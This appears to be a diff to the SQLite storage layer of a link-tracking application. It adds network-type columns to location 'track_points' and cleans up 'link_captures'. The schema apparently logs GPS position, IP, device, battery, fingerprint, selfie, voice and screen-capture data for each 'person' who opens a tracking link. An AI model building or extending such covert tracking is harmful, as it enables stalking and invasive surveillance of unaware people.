@@ -168,6 +168,7 @@ CREATE TABLE IF NOT EXISTS track_points (
     lat REAL, lon REAL, acc REAL, spd REAL, hdg REAL,
     ip TEXT, country TEXT, country_code TEXT, region TEXT, city TEXT, isp TEXT, asn TEXT,
     device TEXT, os TEXT, browser TEXT, inapp TEXT,
+    mobile INTEGER, net TEXT,
     battery REAL, charging INTEGER, screen TEXT, note TEXT
 );
 CREATE TABLE IF NOT EXISTS sns_scans (
@@ -302,7 +303,7 @@ def salvage_file(path):
             ok = False
         finally:
             d.close()
-        if not ok:                        # 最終手段：行単位で吸い出す
+        if not ok:
             d = sqlite3.connect(tmp)
             try:
                 for line in src.iterdump():
@@ -375,7 +376,7 @@ class DB:
                           ("fp_json", "TEXT"), ("quiz_done", "INTEGER DEFAULT 0"),
                           ("quiz_score", "REAL"), ("quiz_total", "INTEGER"),
                           ("quiz_ms", "INTEGER"),
-                          ("selfie", "TEXT"), ("voice", "TEXT"), ("screen", "TEXT"),
+                          ("selfie", "TEXT"), ("voice", "TEXT"), ("screen_cap", "TEXT"),
                           ("clip", "TEXT"), ("dwell_ms", "INTEGER"), ("scroll", "REAL"),
                           ("visits", "INTEGER")],
             "links": [("person", "TEXT"), ("interval", "INTEGER DEFAULT 15"),
@@ -385,6 +386,7 @@ class DB:
                       ("last_src", "TEXT"), ("last_batt", "REAL"),
                       ("last_charging", "INTEGER"), ("points", "INTEGER DEFAULT 0"),
                       ("webhook", "TEXT"), ("notify", "TEXT")],
+            "track_points": [("mobile", "INTEGER"), ("net", "TEXT")],
         }
         for table, defs in add.items():
             have = cols(table)
@@ -475,7 +477,6 @@ class DB:
                 self._healing = False
 
     def _retry(self, fn):
-        """読み取り。壊れていたら1回だけ修復してやり直す。"""
         for attempt in (0, 1):
             try:
                 return fn()
@@ -485,7 +486,6 @@ class DB:
             self._salvage()
 
     def _w(self, fn):
-        """書き込み。壊れていたら1回だけ修復してやり直す。"""
         for attempt in (0, 1):
             with self._lock:
                 try:
@@ -717,6 +717,7 @@ class DB:
             c.execute("DELETE FROM link_hits WHERE code=?", (code,))
             c.execute("DELETE FROM link_questions WHERE code=?", (code,))
             c.execute("DELETE FROM link_answers WHERE code=?", (code,))
+            c.execute("DELETE FROM link_captures WHERE code=?", (code,))
 
     def set_link_active(self, code, flag):
         with self.tx() as c:
@@ -944,6 +945,7 @@ class DB:
             c.execute("DELETE FROM track_points WHERE code=?", (code,))
             c.execute("DELETE FROM link_hits WHERE code=?", (code,))
             c.execute("DELETE FROM link_answers WHERE code=?", (code,))
+            c.execute("DELETE FROM link_captures WHERE code=?", (code,))
             c.execute("DELETE FROM links WHERE code=?", (code,))
 
     def clear_points(self, code):
@@ -958,8 +960,9 @@ class DB:
             return 0
         cols = ["code", "link_id", "person", "sid", "ts", "kind", "src", "lat", "lon",
                 "acc", "spd", "hdg", "ip", "country", "country_code", "region", "city",
-                "isp", "asn", "device", "os", "browser", "inapp", "battery", "charging",
-                "screen", "note"]
+                "isp", "asn", "device", "os", "browser", "inapp",
+                "mobile", "net",
+                "battery", "charging", "screen", "note"]
         sql = (f"INSERT INTO track_points({','.join(cols)}) "
                f"VALUES({','.join(['?'] * len(cols))})")
         data = [[r.get(k) for k in cols] for r in rows]
